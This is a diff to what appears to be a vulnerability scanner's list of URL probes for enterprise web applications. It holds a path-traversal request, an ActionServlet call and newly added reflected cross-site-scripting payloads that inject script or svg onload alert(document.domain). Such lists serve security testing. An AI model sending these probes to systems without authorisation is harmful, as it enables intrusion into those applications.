@@ -1,2 +1,6 @@
 /system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
 /service/~iufo/com.ufida.web.action.ActionServlet?TableSelectedID&TreeSelectedID&action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease
+/index.jsp
+/menu.jsp?flag=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/help/systop.jsp?langcode=1%22%3E%3Csvg%20onload=alert(document.domain)%3E
+/help/systop.jsp?langcode=1%22%3E%3C/script%3E%3Csvg%20onload=alert(document.domain)%3E
